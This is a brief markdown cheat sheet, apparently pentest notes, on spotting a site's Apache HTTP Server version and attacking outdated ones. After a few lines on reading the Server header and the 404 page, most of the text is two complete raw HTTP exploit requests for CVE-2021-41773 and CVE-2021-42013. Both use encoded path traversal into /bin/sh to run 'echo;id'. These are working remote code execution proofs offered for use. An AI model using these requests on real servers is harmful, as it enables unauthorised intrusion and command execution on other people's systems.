# Apache (HTTP Server) Common Bugs

## Introduction
What would you do if you came across a website that uses Apache (HTTP Server)?

## How to Detect
Usually in the HTTP response there is a header like this `Server: Apache` or `Server: Apache/2.4.50` and check the 404 page

1. Find the related CVE by checking Apache (HTTP Server) version
* How to find the Apache (HTTP Server) version

By checking the response header or using 404 page, sometimes the version is printed there. If you found outdated Apache (HTTP Server) version, find the CVEs at [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/Apache-Http-Server.html)

Some example CVE:

- CVE-2021-41773 (RCE and LFI)
```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Content-Length: 7
Content-Type: application/x-www-form-urlencoded
Connection: close

echo;id
```
- CVE-2021-42013 (RCE and LFI)
```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;id
```